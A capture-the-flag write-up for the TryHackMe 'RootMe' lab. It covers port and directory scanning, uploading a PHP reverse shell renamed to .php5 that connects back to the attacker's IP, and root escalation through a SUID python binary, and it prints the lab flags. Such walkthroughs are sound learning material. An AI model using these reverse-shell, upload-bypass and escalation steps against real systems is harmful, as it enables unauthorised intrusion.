<!-- TOC -->

- [RootMe](#rootme)
    - [Reconnaissance](#reconnaissance)
    - [Getting a shell](#getting-a-shell)
    - [Privilege escalation](#privilege-escalation)

<!-- /TOC -->

# RootMe

[RootMe Room](https://tryhackme.com/room/rrootme)

A ctf for beginners, can you root me?

| Title | IP Address |
| :---- | :---- |
| RootMe | 10.10.196.130 |

## Reconnaissance

```bash
sudo nmap -A -vv -T4 -oA initial 10.10.196.130 
```

> `22/tcp open ssh syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`

> `80/tcp open http syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))`

Result: [initial.nmap](initial.nmap)

> `80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))`

```bash
gobuster dir -u 10.10.196.130:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,css,htm,html,js,php,py -t 100
```

> ```
> /uploads              (Status: 301) [Size: 316] [--> http://10.10.196.130/uploads/]
> /index.php            (Status: 200) [Size: 616]                                    
> /css                  (Status: 301) [Size: 312] [--> http://10.10.196.130/css/]    
> /js                   (Status: 301) [Size: 311] [--> http://10.10.196.130/js/]     
> /panel                (Status: 301) [Size: 314] [--> http://10.10.196.130/panel/]  
> /server-status        (Status: 403) [Size: 278]
> ```

## Getting a shell

Using the famous __pentestmonkey's PHP reverse shell__

Copy and modify `/usr/share/webshells/php/php-reverse-shell.php`

```php
// php-reverse-shell.php5
$ip = '10.6.31.75';  // CHANGE THIS
$port = 80;       // CHANGE THIS
```

```bash
mv php-reverse-shell.php php-reverse-shell.php5
```

Upload to: `http://10.10.196.130/panel/`

Go to: `http://10.10.196.130/uploads/php-reverse-shell.php5`

```bash
find / -type f -name user.txt 2>/dev/null
```

> `/var/www/user.txt`

```bash
cat /var/www/user.txt
```

> `THM{y0u_g0t_a_sh3ll}`

## Privilege escalation

```bash
find / -perm -4000 2>/dev/null
```

> `/usr/bin/python`

Using [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid):

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
find / -type f -name root.txt
```

> `/root/root.txt`

```bash
cat /root/root.txt
```

> `THM{pr1v1l3g3_3sc4l4t10n}`
